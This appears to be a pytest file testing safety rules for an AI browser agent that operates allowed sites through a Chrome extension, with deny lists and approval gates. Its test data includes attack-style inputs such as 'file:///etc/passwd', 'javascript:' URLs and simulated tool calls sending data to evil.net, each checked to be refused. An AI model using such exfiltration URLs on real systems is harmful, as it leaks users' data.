"""Browser tasks: the Chrome extension operating allowed sites, one checked action at a time."""

from __future__ import annotations

import json
import re
from pathlib import Path

import pytest
from fastapi import FastAPI
from fastapi.testclient import TestClient

from api.routes import captures as capture_routes
from keeper.auth import require_user_context
from shuttle import browser_tasks as bt
from shuttle import device_tasks as dt
from shuttle import skill_automation as sa

RUN = {"run_id": "run-1", "org_id": "org-a", "user_id": "user-a", "skill_id": "skill-1",
       "inputs": json.dumps({"vendor": "Azure Interior"})}
SITES = ["erp.example.com"]
PAGE = {
    "app": "New purchase order", "url": "https://erp.example.com/purchase/new",
    "text": ('heading "New purchase order"\n[e1] textbox "Vendor" (focused)\n[e2] button "Save"\n'
             '[e3] button "Confirm Order"\n[e4] textbox "Password" (secure)\n[e5] combobox "Currency"'),
    "elements": [
        {"ref": "e1", "role": "textbox", "label": "Vendor", "focused": True},
        {"ref": "e2", "role": "button", "label": "Save"},
        {"ref": "e3", "role": "button", "label": "Confirm Order"},
        {"ref": "e4", "role": "textbox", "label": "Password", "secure": True},
        {"ref": "e5", "role": "combobox", "label": "Currency"},
    ],
    "tabs": [{"ref": "t1", "title": "Vendors", "url": "https://erp.example.com/vendors"}],
}


def _call(name: str, args: dict, call_id: str = "c1") -> dict:
    return {"id": call_id, "type": "function", "function": {"name": name, "arguments": json.dumps(args)}}


class FakeModel:
    def __init__(self, *turns):
        self.turns = list(turns)
        self.seen: list[list[dict]] = []

    async def __call__(self, task, messages):
        self.seen.append(json.loads(json.dumps(messages)))
        turn = self.turns.pop(0)
        return (turn, []) if isinstance(turn, str) else ("", turn)


@pytest.fixture(autouse=True)
def _memory(monkeypatch):
    dt.use_memory_store(True)
    handed: list = []

    async def fake_continue(org_id, user_id, run_id, *, task_id, result):
        handed.append({"run_id": run_id, "task_id": task_id, "result": result})

    monkeypatch.setattr(sa, "continue_after_device", fake_continue)
    monkeypatch.setattr(bt, "_own_origins", lambda: {("app.mindloom.test", 443), ("localhost", 5500)})
    yield handed
    dt.use_memory_store(False)


async def _task(auto_approve: bool = False, sites=SITES) -> dict:
    task = await dt.create_task(RUN, title="Create the PO", goal="Create a PO for Azure Interior",
                                allowed_apps=list(sites), auto_approve=auto_approve, person="Ada",
                                surface="browser")
    await dt.claim("org-a", "user-a", task["task_id"], surface="browser")
    return task


async def _step(task_id: str, result: dict | None = None, page: dict = PAGE) -> dict:
    return await dt.step("org-a", "user-a", task_id, observation=page, result=result)


# --- Sites --------------------------------------------------------------------------------


@pytest.mark.parametrize(("raw", "site"), [
    ("erp.example.com", "erp.example.com"), ("https://ERP.Example.com/odoo/purchase?x=1", "erp.example.com"),
    ("erp.example.com:8443/path", "erp.example.com"), ("*.example.com", "*.example.com"),
    ("localhost", "localhost"), (" example.com. ", "example.com"),
])
def test_sites_are_normalized(raw, site) -> None:
    assert bt.normalize_site(raw) == site


@pytest.mark.parametrize("raw", [
    "", "example", "10.0.0.5", "http://192.168.1.1/admin", "file:///etc/passwd", "javascript:alert(1)",
    "*.localhost", "exa mple.com", "-bad.example.com", "chrome://settings",
])
def test_things_that_are_not_sites(raw) -> None:
    assert bt.normalize_site(raw) is None


def test_allowed_sites_never_include_denied_ones() -> None:
    assert bt.clean_sites(["ERP.example.com", "erp.example.com", "accounts.google.com", "vault.bitwarden.com",
                           "app.mindloom.test", "nonsense", "*.example.org"]) == ["erp.example.com", "*.example.org"]
    assert bt.is_denied_site("login.microsoftonline.com") and bt.is_denied_site("my.1password.com")
    assert not bt.is_denied_site("notaccounts.google.com.example.com")


def test_url_allowed_needs_https_an_allowed_host_and_not_mindloom() -> None:
    assert bt.url_allowed("https://erp.example.com/a?b=c", SITES)
    assert not bt.url_allowed("http://erp.example.com/a", SITES)
    assert not bt.url_allowed("https://other.example.com/", SITES)
    assert not bt.url_allowed("https://erp.example.com.evil.net/", SITES)
    assert not bt.url_allowed("https://user:pw@erp.example.com/", SITES)
    assert not bt.url_allowed("javascript:alert(1)", SITES)
    assert bt.url_allowed("https://a.b.example.org/", ["*.example.org"])
    assert bt.url_allowed("https://example.org/", ["*.example.org"])
    assert not bt.url_allowed("https://badexample.org/", ["*.example.org"])
    # A wildcard never reaches a denied site, and never MindLoom's own pages.
    assert not bt.url_allowed("https://accounts.google.com/", ["*.google.com"])
    assert not bt.url_allowed("https://app.mindloom.test/workflows", ["*.mindloom.test"])
    # On localhost only the port tells MindLoom's web app from a site under test.
    assert bt.url_allowed("http://localhost:8069/odoo", ["localhost"])
    assert not bt.url_allowed("http://localhost:5500/workflows", ["localhost"])


def test_sites_come_from_the_recorded_steps() -> None:
    class Anchor:
        def __init__(self, url):
            self.url = url

    class Step:
        def __init__(self, url):
            self.browser_anchor = Anchor(url) if url else None

    class Skill:
        guide_steps = [Step("https://erp.example.com/purchase"), Step(None), Step("https://erp.example.com/x"),
                       Step("https://accounts.google.com/signin"), Step("https://portal.supplier.io/")]

    assert bt.sites_in_skill(Skill()) == ["erp.example.com", "portal.supplier.io"]


def test_browser_tools_are_well_formed() -> None:
    names = [t["function"]["name"] for t in bt.TOOLS]
    assert len(names) == len(set(names))
    assert set(names) == bt.ACTION_TOOLS | {"ask_person", "done"}
    for tool in bt.TOOLS:
        params = tool["function"]["parameters"]
        assert set(params["required"]) <= set(params["properties"])


# --- Policy -------------------------------------------------------------------------------


def test_validate_action() -> None:
    elements = dt._elements(PAGE)
    check = lambda name, args, page=PAGE: bt.validate_action(name, args, elements, SITES, page)  # noqa: E731
    assert check("press", {"ref": "e2"}) is None
    assert "No element" in check("press", {"ref": "e99"})
    assert "Never fill" in check("set_value", {"ref": "e4", "text": "x"})
    assert "Never fill" in check("read", {"ref": "e4"})
    assert check("open_url", {"url": "https://erp.example.com/purchase"}) is None
    assert "not an https page on an allowed site" in check("open_url", {"url": "https://evil.net/?d=secret"})
    assert "not an https page on an allowed site" in check("open_url", {"url": "http://erp.example.com/"})
    assert check("switch_tab", {"tab": "t1"}) is None
    assert "No tab" in check("switch_tab", {"tab": "t9"})
    assert check("key", {"combo": "Enter"}) is None and check("key", {"combo": "shift+tab"}) is None
    assert "Use one of" in check("key", {"combo": "ctrl+w"})
    assert "Use one of" in check("key", {"combo": "a"})
    assert check("scroll", {"direction": "down"}) is None
    assert "direction" in check("scroll", {"direction": "sideways"})
    assert "Unknown tool" in check("select_menu", {"path": ["File"]})
    secure_focus = {"e4": {**elements["e4"], "focused": True}}
    assert "Never type" in bt.validate_action("type_text", {"text": "x"}, secure_focus, SITES, PAGE)


def test_nothing_can_be_used_on_a_page_that_is_not_allowed() -> None:
    elements = dt._elements(PAGE)
    elsewhere = {**PAGE, "url": "https://login.microsoftonline.com/common/oauth2"}
    assert "not on an allowed site" in bt.validate_action("press", {"ref": "e2"}, elements, SITES, elsewhere)
    assert "not on an allowed site" in bt.validate_action("type_text", {"text": "x"}, elements, SITES, elsewhere)
    # Leaving is always possible.
    assert bt.validate_action("open_url", {"url": "https://erp.example.com/"}, elements, SITES, elsewhere) is None
    assert bt.validate_action("go_back", {}, elements, SITES, elsewhere) is None
    assert "not on an allowed site" in bt.screen_header(elsewhere, SITES)


def test_an_open_dialog_must_be_answered_first() -> None:
    elements = dt._elements(PAGE)
    blocked = {**PAGE, "dialog": {"type": "confirm", "message": "Delete 3 lines?"}}
    assert "dialog is open" in bt.validate_action("press", {"ref": "e2"}, elements, SITES, blocked)
    assert bt.validate_action("answer_dialog", {"accept": False}, elements, SITES, blocked) is None
    assert "No dialog" in bt.validate_action("answer_dialog", {"accept": True}, elements, SITES, PAGE)
    assert bt.irreversible_reason("answer_dialog", {"accept": True}, elements, blocked)
    assert not bt.irreversible_reason("answer_dialog", {"accept": False}, elements, blocked)
    alert = {**PAGE, "dialog": {"type": "alert", "message": "Saved"}}
    assert not bt.irreversible_reason("answer_dialog", {"accept": True}, elements, alert)
    assert "Delete 3 lines?" in bt.screen_header(blocked, SITES)


def test_irreversible_reason_uses_either_check() -> None:
    elements = dt._elements(PAGE)
    assert bt.irreversible_reason("press", {"ref": "e3"}, elements, PAGE)  # label
    assert bt.irreversible_reason("press", {"ref": "e2", "irreversible": True}, elements, PAGE)  # model flag
    assert not bt.irreversible_reason("press", {"ref": "e2"}, elements, PAGE)
    assert not bt.irreversible_reason("set_value", {"ref": "e1", "text": "x", "irreversible": True}, elements, PAGE)
    assert not bt.irreversible_reason("key", {"combo": "enter"}, elements, PAGE)  # focus is a text field
    on_button = {**elements, "e1": {**elements["e1"], "focused": False}, "e3": {**elements["e3"], "focused": True}}
    assert bt.irreversible_reason("key", {"combo": "enter"}, on_button, PAGE)
    assert bt.irreversible_reason("key", {"combo": "tab", "irreversible": True}, elements, PAGE)


# --- The step loop on the browser surface -------------------------------------------------


async def test_each_app_only_sees_and_claims_its_own_tasks() -> None:
    browser = await dt.create_task(RUN, title="In Chrome", goal="g", allowed_apps=SITES,
                                   auto_approve=False, surface="browser")
    mac = await dt.create_task(RUN, title="On the Mac", goal="g", allowed_apps=["Numbers"], auto_approve=False)
    assert [t["task_id"] for t in await dt.list_tasks("org-a", "user-a", "pending")] == [mac["task_id"]]
    assert [t["task_id"] for t in await dt.list_tasks("org-a", "user-a", "pending", surface="browser")] == [
        browser["task_id"]]
    for task, wrong in ((browser, "mac"), (mac, "browser")):
        with pytest.raises(Exception) as err:
            await dt.claim("org-a", "user-a", task["task_id"], surface=wrong)
        assert err.value.status_code == 409
    claimed = await dt.claim("org-a", "user-a", browser["task_id"], surface="browser")
    assert claimed["surface"] == "browser" and claimed["allowed_apps"] == SITES
    assert claimed["log"][-1]["summary"] == "Chrome started"


async def test_the_browser_prompt_tools_and_page_reach_the_model(monkeypatch) -> None:
    task = await _task()
    stored = dt._memory[task["task_id"]]
    system = json.loads(stored["messages"])[0]["content"]
    assert "Allowed sites: erp.example.com" in system and "Chrome" in system and "Accessibility" not in system

    model = FakeModel([_call("set_value", {"ref": "e1", "text": "Azure Interior"})],
                      [_call("done", {"summary": "PO P00042 created"})])
    monkeypatch.setattr(dt, "_model_call", model)
    first = await _step(task["task_id"])
    assert first["action"]["tool"] == "set_value" and first["action"]["description"] == (
        "Enter “Azure Interior” in “Vendor”")
    screen = model.seen[0][-1]["content"]
    assert "Address: https://erp.example.com/purchase/new" in screen and "[t1] Vendors" in screen
    assert '[e2] button "Save"' in screen

    done = await _step(task["task_id"], result={"ok": True, "detail": "The field now shows “Azure Interior”."})
    assert done["status"] == "completed"
    assert "now shows" in model.seen[1][-1]["content"]


async def test_real_model_call_uses_the_browser_tools(monkeypatch) -> None:
    task = await _task()
    seen = {}

    class Completions:
        async def create(self, **kwargs):
            seen.update(kwargs)

            class Message:
                content = "ok"
                tool_calls = None

            return type("R", (), {"choices": [type("C", (), {"message": Message})]})

    async def fake_client(org_id):
        return type("Client", (), {"chat": type("Chat", (), {"completions": Completions()})})

    import core.llm_provider as llm

    monkeypatch.setattr(llm, "get_llm_client", fake_client)
    await dt._model_call(dt._memory[task["task_id"]], [])
    assert {t["function"]["name"] for t in seen["tools"]} >= {"open_url", "select_option", "answer_dialog"}


async def test_opening_a_site_that_is_not_allowed_is_refused(monkeypatch) -> None:
    task = await _task()
    model = FakeModel([_call("open_url", {"url": "https://evil.net/collect?po=P00042"})],
                      [_call("done", {"summary": "stopped", "outcome": "not_done"})])
    monkeypatch.setattr(dt, "_model_call", model)
    response = await _step(task["task_id"])
    assert response["action"] is None and response["status"] == "completed"
    assert "not an https page on an allowed site" in model.seen[1][-1]["content"]


async def test_irreversible_click_waits_for_approval(monkeypatch) -> None:
    task = await _task()
    monkeypatch.setattr(dt, "_model_call", FakeModel([_call("press", {"ref": "e3"})]))
    waiting = await _step(task["task_id"])
    assert waiting["status"] == "needs_approval" and waiting["action"] is None
    assert waiting["task"]["pending"]["description"] == "Click “Confirm Order”"
    await dt.reply("org-a", "user-a", task["task_id"], action="approve")
    delivered = await _step(task["task_id"])
    assert delivered["action"]["approved"] is True and delivered["action"]["expect_label"] == "Confirm Order"


async def test_accepting_a_confirm_dialog_waits_for_approval(monkeypatch) -> None:
    task = await _task()
    monkeypatch.setattr(dt, "_model_call", FakeModel([_call("answer_dialog", {"accept": True})]))
    page = {**PAGE, "dialog": {"type": "confirm", "message": "Post this journal entry?"}}
    waiting = await _step(task["task_id"], page=page)
    assert waiting["status"] == "needs_approval"
    assert "Post this journal entry?" in waiting["task"]["pending"]["reason"]


async def test_extension_side_check_turns_into_an_approval(monkeypatch) -> None:
    """Enter in a form whose button says Submit: only the extension can see that."""

    task = await _task()
    model = FakeModel([_call("key", {"combo": "enter"})])
    monkeypatch.setattr(dt, "_model_call", model)
    sent = await _step(task["task_id"])
    assert sent["action"]["tool"] == "key" and sent["action"]["approved"] is False
    blocked = await _step(task["task_id"], result={
        "ok": False, "blocked": "needs_approval", "detail": "Enter would press “Submit order”"})
    assert blocked["status"] == "needs_approval"
    assert blocked["task"]["pending"]["reason"] == "Enter would press “Submit order”"


async def test_read_text_goes_back_to_the_model(monkeypatch) -> None:
    task = await _task()
    model = FakeModel([_call("read", {"ref": "e5"})], [_call("done", {"summary": "ok"})])
    monkeypatch.setattr(dt, "_model_call", model)
    await _step(task["task_id"])
    await _step(task["task_id"], result={"ok": True, "detail": "Read 3 lines", "text": "USD\nEUR\nINR " + "x" * 20_000})
    content = model.seen[1][-1]["content"]
    assert "USD\\nEUR\\nINR" in content
    assert len(content) < dt.MAX_READ_CHARS + 3000 + dt.MAX_SCREEN_CHARS


async def test_browser_tasks_get_a_larger_step_budget(monkeypatch) -> None:
    task = await _task()
    dt._memory[task["task_id"]]["steps"] = dt.MAX_STEPS
    monkeypatch.setattr(dt, "_model_call", FakeModel([_call("press", {"ref": "e2"})]))
    assert (await _step(task["task_id"]))["action"]["tool"] == "press"
    dt._memory[task["task_id"]]["steps"] = bt.MAX_STEPS
    dt._memory[task["task_id"]]["pending"] = None
    assert (await _step(task["task_id"]))["status"] == "failed"


# --- The automation hand-off ----------------------------------------------------------------


def _run() -> dict:
    return {**RUN, "status": "running", "messages": json.dumps([{"role": "system", "content": "x"}]),
            "log": "[]", "pending": None}


async def test_hand_off_creates_a_browser_task_for_allowed_sites() -> None:
    run = _run()
    calls = [_call("hand_off_to_browser", {
        "steps": "Create the purchase order", "details": "Qty 40, price 12.50",
        "start_url": "https://erp.example.com/purchase/new"})]
    assert await sa._drain(run, calls, False, device_apps=["Numbers"],
                           browser_sites=["erp.example.com", "accounts.google.com"],
                           skill_text="Skill: Purchase orders", person="Ada") is False
    pending = json.loads(run["pending"])
    assert run["status"] == "waiting_device" and pending["surface"] == "browser"
    task = dt._memory[pending["device_task_id"]]
    assert task["surface"] == "browser" and json.loads(task["allowed_apps"]) == ["erp.example.com"]
    goal = json.loads(task["messages"])[1]["content"]
    assert "Skill: Purchase orders" in goal and "Azure Interior" in goal and "Qty 40" in goal
    assert "in Chrome" in goal and "Start on: https://erp.example.com/purchase/new" in goal


async def test_hand_off_without_allowed_sites_waits_for_the_person() -> None:
    run = _run()
    assert await sa._drain(run, [_call("hand_off_to_browser", {"steps": "Post the bill"})], False,
                           device_apps=["Numbers"]) is False
    pending = json.loads(run["pending"])
    assert run["status"] == "waiting_device" and pending["device_task_id"] is None and pending["surface"] == "browser"
    assert dt._memory == {}


async def test_mac_hand_off_still_makes_a_mac_task() -> None:
    run = _run()
    assert await sa._drain(run, [_call("hand_off_to_device", {"steps": "Enter it in Numbers"})], False,
                           device_apps=["Numbers"], browser_sites=["erp.example.com"]) is False
    task = dt._memory[json.loads(run["pending"])["device_task_id"]]
    assert task["surface"] == "mac" and json.loads(task["allowed_apps"]) == ["Numbers"]


def test_engine_offers_the_browser_hand_off() -> None:
    spec = next(t for t in sa.tool_specs() if t["function"]["name"] == "hand_off_to_browser")
    assert {"steps", "details", "start_url"} <= set(spec["function"]["parameters"]["properties"])
    assert "hand_off_to_browser" in sa.TOOL_CATALOG and '"sites"' in sa._PLAN_SYSTEM


# --- Routes ---------------------------------------------------------------------------------


@pytest.fixture
def client():
    app = FastAPI()
    app.include_router(capture_routes.router)
    app.dependency_overrides[require_user_context] = lambda: ("org-a", "user-a")
    return TestClient(app)


async def test_routes_drive_a_browser_task(client, monkeypatch) -> None:
    task = await dt.create_task(RUN, title="Create the PO", goal="g", allowed_apps=SITES,
                                auto_approve=False, surface="browser")
    task_id = task["task_id"]
    assert client.get("/captures/device-tasks?status=pending").json() == []
    listed = client.get("/captures/device-tasks?status=pending&surface=browser").json()
    assert [t["task_id"] for t in listed] == [task_id] and listed[0]["surface"] == "browser"
    assert client.post(f"/captures/device-tasks/{task_id}/claim").status_code == 409  # the Mac app
    assert client.post(f"/captures/device-tasks/{task_id}/claim?surface=browser").status_code == 200

    monkeypatch.setattr(dt, "_model_call", FakeModel([_call("select_option", {"ref": "e5", "option": "EUR"})]))
    body = {"observation": {**PAGE, "dialog": None},
            "result": {"ok": False, "detail": "", "blocked": "site_not_allowed", "text": "t"}}
    response = client.post(f"/captures/device-tasks/{task_id}/step", json=body)
    assert response.status_code == 200, response.text
    assert response.json()["action"]["description"] == "Choose “EUR” in “Currency”"


# --- The extension keeps the same lists ------------------------------------------------------


def test_extension_uses_the_same_safety_lists() -> None:
    """The extension checks every click again with its own copy of these lists."""

    script = (Path(__file__).resolve().parents[2] / "browser-extension/task-policy.js").read_text()

    def js_list(name: str) -> set[str]:
        body = re.search(rf"const {name} = \[(.*?)\];", script, re.S).group(1)
        return set(re.findall(r'"([^"]+)"', body))

    assert js_list("IRREVERSIBLE_WORDS") == set(dt._IRREVERSIBLE_WORDS)
    assert js_list("DENIED_SITES") == set(bt.DENIED_SITES)


# --- Files and pages drawn as a picture ------------------------------------------------------


def test_uploads_always_need_approval_and_downloads_follow_the_label() -> None:
    elements = dt._elements(PAGE)
    assert "invoice.pdf" in bt.irreversible_reason("upload_file", {"ref": "e2", "file_name": "invoice.pdf"}, elements, PAGE)
    assert "file's name" in bt.validate_action("upload_file", {"ref": "e2", "file_name": " "}, elements, SITES, PAGE)
    assert bt.validate_action("upload_file", {"ref": "e2", "file_name": "invoice.pdf"}, elements, SITES, PAGE) is None
    assert not bt.irreversible_reason("download_file", {"ref": "e2"}, elements, PAGE)
    assert bt.irreversible_reason("download_file", {"ref": "e3"}, elements, PAGE)  # "Confirm Order"
    assert bt.describe("upload_file", {"ref": "e2", "file_name": "invoice.pdf"}, elements, PAGE) == (
        "Upload “invoice.pdf” with “Save”")


def test_click_by_position_is_checked() -> None:
    elements = dt._elements(PAGE)
    check = lambda args: bt.validate_action("click_at", args, elements, SITES, PAGE)  # noqa: E731
    assert check({"x": 150, "y": 160}) is None
    assert "numbers" in check({"x": "left", "y": 1})
    assert "inside the picture" in check({"x": -4, "y": 1})
    assert bt.validate_action("look", {}, elements, SITES, PAGE) is None
    assert bt.irreversible_reason("click_at", {"x": 1, "y": 1, "irreversible": True}, elements, PAGE)
    assert not bt.irreversible_reason("click_at", {"x": 1, "y": 1}, elements, PAGE)
    elsewhere = {**PAGE, "url": "https://evil.net/"}
    assert "not on an allowed site" in bt.validate_action("click_at", {"x": 1, "y": 1}, elements, SITES, elsewhere)


PICTURE = "data:image/jpeg;base64," + "A" * 400


async def test_a_picture_reaches_the_model_and_only_the_latest_is_kept(monkeypatch) -> None:
    task = await _task()
    model = FakeModel([_call("look", {}, "c1")], [_call("look", {}, "c2")], [_call("click_at", {"x": 5, "y": 6}, "c3")])
    monkeypatch.setattr(dt, "_model_call", model)
    await _step(task["task_id"])
    await _step(task["task_id"], result={"ok": True, "detail": "picture", "image": PICTURE})
    pictures = [m for m in model.seen[1] if isinstance(m["content"], list)]
    assert len(pictures) == 1 and pictures[0]["content"][1]["image_url"]["url"] == PICTURE
    sent = await _step(task["task_id"], result={"ok": True, "detail": "picture", "image": PICTURE})
    assert sent["action"]["tool"] == "click_at"
    assert len([m for m in model.seen[2] if isinstance(m["content"], list)]) == 1
    assert sum("earlier picture" in str(m["content"]) for m in model.seen[2]) == 1


async def test_a_model_that_takes_no_pictures_goes_on_without_them(monkeypatch) -> None:
    task = await _task()
    calls = {"n": 0}

    async def model(task, messages):
        calls["n"] += 1
        if calls["n"] == 1:
            return "", [_call("look", {})]
        if any(isinstance(m["content"], list) for m in messages):
            raise RuntimeError("image input is not supported")
        assert "not available with this model" in messages[-1]["content"]
        return "", [_call("ask_person", {"instruction": "Tell me what cell B2 says."})]

    monkeypatch.setattr(dt, "_model_call", model)
    await _step(task["task_id"])
    response = await _step(task["task_id"], result={"ok": True, "detail": "picture", "image": PICTURE})
    assert response["status"] == "needs_person"


def test_step_route_takes_a_picture_and_refuses_other_data(client) -> None:
    body = {"observation": PAGE, "result": {"ok": True, "image": "data:text/html;base64,PHNjcmlwdD4="}}
    assert client.post("/captures/device-tasks/x/step", json=body).status_code == 422
    body["result"]["image"] = PICTURE
    assert client.post("/captures/device-tasks/x/step", json=body).status_code == 404  # valid, no such task


# --- Records: the same steps for many items ---------------------------------------------------


async def _records_task(records, **kwargs) -> dict:
    task = await dt.create_task(RUN, title="Post the invoices", goal="Post each invoice in the ERP",
                                allowed_apps=SITES, auto_approve=False, person="Ada", surface="browser",
                                records=records, **kwargs)
    await dt.claim("org-a", "user-a", task["task_id"], surface="browser")
    return task


async def test_each_record_gets_a_fresh_conversation_and_its_own_result(monkeypatch, _memory) -> None:
    task = await _records_task(["INV-1 for 100", {"invoice": "INV-2", "amount": 250}, "  "])
    stored = dt._memory[task["task_id"]]
    assert "record 1 of 2" in json.loads(stored["messages"])[1]["content"]
    assert (await dt.get_task("org-a", "user-a", task["task_id"]))["progress"] == {"done": 0, "total": 2}

    model = FakeModel(
        [_call("set_value", {"ref": "e1", "text": "INV-1"})],
        [_call("done", {"summary": "INV-1 posted as J-501"})],
        [_call("done", {"summary": "INV-2 is already posted", "outcome": "not_done"})],
    )
    monkeypatch.setattr(dt, "_model_call", model)
    await _step(task["task_id"])
    done = await _step(task["task_id"], result={"ok": True, "detail": "ok"})
    assert done["status"] == "completed" and done["task"]["progress"] == {"done": 2, "total": 2}
    assert done["task"]["summary"] == "1 of 2 records done, 1 not done."

    # The second record started clean: the system prompt, its own goal, the screen.
    second = model.seen[2]
    assert [m["role"] for m in second] == ["system", "user", "user"]
    assert "record 2 of 2" in second[1]["content"] and '"invoice": "INV-2"' in second[1]["content"]
    assert "INV-1 posted as J-501" in second[1]["content"] and "Current screen" in second[2]["content"]

    handed = _memory[0]["result"]
    assert handed["outcome"] == "partly_done" and handed["records_not_tried"] == 0
    assert [r["outcome"] for r in handed["records"]] == ["done", "not_done"]
    assert handed["records"][0] == {"record": "INV-1 for 100", "outcome": "done", "summary": "INV-1 posted as J-501"}


async def test_a_record_that_runs_out_of_actions_does_not_stop_the_rest(monkeypatch, _memory) -> None:
    task = await _records_task(["A", "B"])
    stored = dt._memory[task["task_id"]]
    batch = json.loads(stored["batch"])
    batch["steps"] = bt.MAX_STEPS
    stored["batch"] = json.dumps(batch)
    stored["steps"] = bt.MAX_STEPS
    model = FakeModel([_call("done", {"summary": "B done"})])
    monkeypatch.setattr(dt, "_model_call", model)
    done = await _step(task["task_id"])
    assert done["status"] == "completed"
    assert "record 2 of 2" in model.seen[0][1]["content"]
    records = _memory[0]["result"]["records"]
    assert records[0]["outcome"] == "not_done" and "150 actions" in records[0]["summary"]
    assert records[1] == {"record": "B", "outcome": "done", "summary": "B done"}


async def test_three_failures_in_a_row_end_the_list(monkeypatch, _memory) -> None:
    task = await _records_task(["A", "B", "C", "D", "E"])
    fail = lambda: [_call("done", {"summary": "The site is down", "outcome": "not_done"})]  # noqa: E731
    monkeypatch.setattr(dt, "_model_call", FakeModel(fail(), fail(), fail()))
    done = await _step(task["task_id"])
    assert done["status"] == "completed" and "2 were not tried" in done["task"]["summary"]
    handed = _memory[0]["result"]
    assert handed["outcome"] == "not_done" and handed["records_not_tried"] == 2 and len(handed["records"]) == 3


async def test_records_are_capped_and_cleaned() -> None:
    cleaned = dt.clean_records(["x" * 5000, "", None, {"a": 1}] + ["r"] * 400)
    assert len(cleaned) == dt.MAX_RECORDS and len(cleaned[0]) == dt.MAX_RECORD_CHARS and cleaned[1] == '{"a": 1}'
    assert dt.clean_records("not a list") == [] and dt.clean_records(None) == []


async def test_hand_off_passes_records_to_the_task() -> None:
    run = _run()
    calls = [_call("hand_off_to_browser", {"steps": "Post each invoice", "records": ["INV-1", "INV-2"]})]
    assert await sa._drain(run, calls, False, browser_sites=SITES, skill_text="Skill: Invoices") is False
    task = dt._memory[json.loads(run["pending"])["device_task_id"]]
    assert json.loads(task["batch"])["items"] == ["INV-1", "INV-2"]
    for name in ("hand_off_to_browser", "hand_off_to_device"):
        spec = next(t for t in sa.tool_specs() if t["function"]["name"] == name)
        assert spec["function"]["parameters"]["properties"]["records"]["type"] == "array"


async def test_a_task_without_records_is_unchanged(monkeypatch, _memory) -> None:
    task = await _task()
    assert dt._memory[task["task_id"]]["batch"] is None
    monkeypatch.setattr(dt, "_model_call", FakeModel([_call("done", {"summary": "all done"})]))
    done = await _step(task["task_id"])
    assert done["status"] == "completed" and "progress" not in done["task"]
    assert "records" not in _memory[0]["result"] and _memory[0]["result"]["actions"] == []
